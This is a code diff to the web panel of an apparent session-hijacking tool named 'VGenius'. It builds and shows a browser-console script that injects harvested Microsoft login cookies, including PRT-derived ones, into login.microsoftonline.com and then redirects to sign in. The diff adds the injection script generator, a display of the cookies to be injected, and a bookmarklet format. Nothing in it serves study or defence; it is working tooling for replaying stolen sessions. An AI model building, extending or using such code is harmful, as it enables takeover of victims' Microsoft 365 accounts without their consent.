@@ -611,9 +611,22 @@
             </div>
             <div id="cookieScriptResult" style="display:none;">
                 <p style="font-size:11px;color:var(--muted);margin-bottom:12px;">
-                    Copy this script and paste it into the browser console on the Microsoft login page.
+                    Copy this script and paste it into the browser console on <code>login.microsoftonline.com</code>.
                 </p>
-                <pre id="cookieScriptContent" style="background:#0d0d0f;border:1px solid var(--border);border-radius:8px;padding:12px;font-size:10px;overflow-x:auto;max-height:300px;white-space:pre-wrap;word-break:break-all;color:var(--text-main);"></pre>
+                <!-- Cookies that will be injected -->
+                <div style="margin-bottom:12px;">
+                    <label style="display:block;font-size:11px;color:var(--text);margin-bottom:6px;font-weight:600;">
+                        <i class="fas fa-cookie"></i> Cookies to be injected (<span id="cookieInjectCount">0</span>):
+                    </label>
+                    <div id="cookieInjectList" style="background:#0d0d0f;border:1px solid var(--border);border-radius:8px;padding:8px;font-size:10px;max-height:120px;overflow-y:auto;color:var(--text-main);font-family:monospace;"></div>
+                </div>
+                <!-- Injection script -->
+                <div style="margin-bottom:12px;">
+                    <label style="display:block;font-size:11px;color:var(--text);margin-bottom:6px;font-weight:600;">
+                        <i class="fas fa-code"></i> Injection Script:
+                    </label>
+                    <pre id="cookieScriptContent" style="background:#0d0d0f;border:1px solid var(--border);border-radius:8px;padding:12px;font-size:10px;overflow-x:auto;max-height:200px;white-space:pre-wrap;word-break:break-all;color:var(--text-main);"></pre>
+                </div>
                 <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:16px;">
                     <button class="btn-outline" onclick="closeCookieScriptModal()">Close</button>
                     <button class="btn-accent-sm" onclick="copyCookieScript()">
@@ -822,15 +835,36 @@
             document.getElementById('cookieJson').value = JSON.stringify(cookies, null, 2);
 
             // Bookmarklet / console script
+            // IMPORTANT: Must use domain=.login.microsoftonline.com (NOT .microsoftonline.com)
+            // because document.cookie CANNOT set parent-domain cookies.
+            // The user MUST be on login.microsoftonline.com when running this script.
             if (Array.isArray(cookies)) {
-                document.getElementById('cookieScript').value = cookies.map(c => {
-                    let cmd = 'document.cookie="' + c.name + '=' + encodeURIComponent(c.value);
-                    if (c.path) cmd += ';path=' + c.path;
-                    if (c.secure !== false) cmd += ';secure';
-                    if (c.sameSite) cmd += ';samesite=' + c.sameSite.toLowerCase();
-                    cmd += '";';
-                    return cmd;
-                }).join('\n') + '\nconsole.log("Cookies set. Refresh the page.");';
+                var cookieData = cookies.map(function(c) {
+                    return { name: c.name, value: c.value, path: c.path || '/', secure: c.secure !== false, sameSite: c.sameSite || 'None' };
+                });
+                var scriptLines = [
+                    '// VGenius Cookie Injection Script',
+                    '// IMPORTANT: Paste this in console on https://login.microsoftonline.com',
+                    '// The cookies will be set and you will be redirected to authenticate',
+                    '(function() {',
+                    '  "use strict";',
+                    '  var cookies = ' + JSON.stringify(cookieData) + ';',
+                    '  var injected = 0;',
+                    '  for (var i = 0; i < cookies.length; i++) {',
+                    '    var c = cookies[i];',
+                    '    try {',
+                    '      document.cookie = c.name + "=" + encodeURIComponent(c.value) + "; domain=.login.microsoftonline.com; path=" + (c.path || "/") + "; Secure; SameSite=" + (c.sameSite || "None");',
+                    '      injected++;',
+                    '      console.log("[VGenius] Set: " + c.name);',
+                    '    } catch(e) {',
+                    '      console.error("[VGenius] Failed: " + c.name, e);',
+                    '    }',
+                    '  }',
+                    '  console.log("[VGenius] Injected " + injected + "/" + cookies.length + " cookies");',
+                    '  setTimeout(function() { window.location.href = "https://login.microsoftonline.com/"; }, 1500);',
+                    '})();'
+                ];
+                document.getElementById('cookieScript').value = scriptLines.join('\n');
             } else {
                 document.getElementById('cookieScript').value = '';
             }
@@ -1539,14 +1573,31 @@
                 document.getElementById('cookieScriptLoading').style.display = 'none';
                 document.getElementById('cookieScriptResult').style.display = 'block';
 
-                const script = data.script || data.prt_script || '';
+                // Use bookmarklet if available (new format), fallback to old script
+                const script = data.bookmarklet || data.script || data.prt_script || '';
                 document.getElementById('cookieScriptContent').textContent = script || 'No script generated';
+
+                // Show cookies that will be injected
+                const cookies = data.cookies || [];
+                document.getElementById('cookieInjectCount').textContent = cookies.length;
+                const cookieListEl = document.getElementById('cookieInjectList');
+                if (cookies.length > 0) {
+                    cookieListEl.innerHTML = cookies.map(c => {
+                        const name = c.name || 'unknown';
+                        const domain = c.domain || '.login.microsoftonline.com';
+                        const value = c.value ? (c.value.length > 40 ? c.value.substring(0, 40) + '...' : c.value) : '(empty)';
+                        return `<div style="padding:2px 0;border-bottom:1px solid var(--border);"><span style="color:var(--accent);">${name}</span> → <span style="color:var(--muted);">${domain}</span></div>`;
+                    }).join('');
+                } else {
+                    cookieListEl.innerHTML = '<div style="color:var(--muted);padding:4px;">No cookies available</div>';
+                }
 
                 const count = data.cookie_count || 0;
                 let msg = `Generated ${count} cookies`;
                 if (data.fresh) msg += ' (FRESH)';
                 if (data.used_fallback) msg += ' (used stored - exchange failed)';
                 if (data.exchange_error) msg += `\n⚠️ Exchange error: ${data.exchange_error}`;
+                if (data.bookmarklet) msg += ' [BOOKMARKLET FORMAT]';
                 showToast(msg);
             } catch (e) {
                 document.getElementById('cookieScriptLoading').style.display = 'none';
